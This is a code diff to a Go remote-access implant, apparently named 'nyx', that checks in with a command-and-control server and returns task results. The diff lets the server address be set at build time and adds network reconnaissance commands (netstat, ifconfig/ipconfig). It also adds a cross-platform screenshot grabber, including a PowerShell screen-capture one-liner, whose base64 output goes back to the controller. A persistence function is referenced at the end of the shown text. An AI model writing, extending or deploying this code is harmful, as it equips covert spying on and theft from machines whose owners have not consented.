@@ -18,7 +18,8 @@ import (
 	"time"
 )
 
-const C2_URL = "http://127.0.0.1:8000"
+// Overridden at build time via -ldflags "-X main.C2URL=https://..."
+var C2URL = "http://127.0.0.1:8000"
 
 type CheckinRequest struct {
 	Hostname string `json:"hostname"`
@@ -84,7 +85,7 @@ func checkin(agentID string) (*CheckinResponse, error) {
 	}
 
 	data, _ := json.Marshal(payload)
-	resp, err := client.Post(C2_URL+"/api/agents/checkin", "application/json", bytes.NewBuffer(data))
+	resp, err := client.Post(C2URL+"/api/agents/checkin", "application/json", bytes.NewBuffer(data))
 	if err != nil {
 		return nil, err
 	}
@@ -120,7 +121,7 @@ func handleTask(agentID string, task *Task) {
 
 	result := TaskResult{TaskID: task.ID, Output: output, Status: status}
 	data, _ := json.Marshal(result)
-	url := fmt.Sprintf("%s/api/agents/%s/result", C2_URL, agentID)
+	url := fmt.Sprintf("%s/api/agents/%s/result", C2URL, agentID)
 	resp, err := client.Post(url, "application/json", bytes.NewBuffer(data))
 	if err != nil {
 		fmt.Printf("[-] Failed to send result: %v\n", err)
@@ -268,6 +269,35 @@ func dispatch(command string) (string, string) {
 		}
 		return fmt.Sprintf("Sleep interval acknowledged: %ss", arg), "completed"
 
+	case "screenshot":
+		return takeScreenshot()
+
+	case "netstat":
+		var out string
+		var err error
+		if runtime.GOOS == "windows" {
+			out, err = executeShell("netstat -ano")
+		} else {
+			out, err = executeShell("netstat -tuln 2>/dev/null || ss -tuln")
+		}
+		if err != nil {
+			return out, "failed"
+		}
+		return out, "completed"
+
+	case "ifconfig", "ipconfig":
+		var out string
+		var err error
+		if runtime.GOOS == "windows" {
+			out, err = executeShell("ipconfig /all")
+		} else {
+			out, err = executeShell("ifconfig 2>/dev/null || ip addr")
+		}
+		if err != nil {
+			return out, "failed"
+		}
+		return out, "completed"
+
 	case "kill":
 		fmt.Println("[!] Kill command received, exiting.")
 		os.Exit(0)
@@ -281,6 +311,36 @@ func dispatch(command string) (string, string) {
 		}
 		return out, "completed"
 	}
+}
+
+func takeScreenshot() (string, string) {
+	tmpFile := fmt.Sprintf("/tmp/nyx_screen_%d.png", time.Now().Unix())
+	var err error
+
+	switch runtime.GOOS {
+	case "darwin":
+		_, err = executeShell(fmt.Sprintf("screencapture -x %s", tmpFile))
+	case "linux":
+		_, err = executeShell(fmt.Sprintf("import -window root %s 2>/dev/null || scrot %s 2>/dev/null || gnome-screenshot -f %s", tmpFile, tmpFile, tmpFile))
+	case "windows":
+		ps := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); $b.Save('%s')`, tmpFile)
+		_, err = executeShell(fmt.Sprintf("powershell -Command \"%s\"", ps))
+	default:
+		return "Unsupported OS: " + runtime.GOOS, "failed"
+	}
+
+	if err != nil {
+		return "Screenshot failed: " + err.Error(), "failed"
+	}
+
+	data, readErr := os.ReadFile(tmpFile)
+	os.Remove(tmpFile)
+	if readErr != nil {
+		return "Could not read screenshot: " + readErr.Error(), "failed"
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(data)
+	return fmt.Sprintf("SCREENSHOT:BASE64:%s", encoded), "completed"
 }
 
 func installPersistence() string {
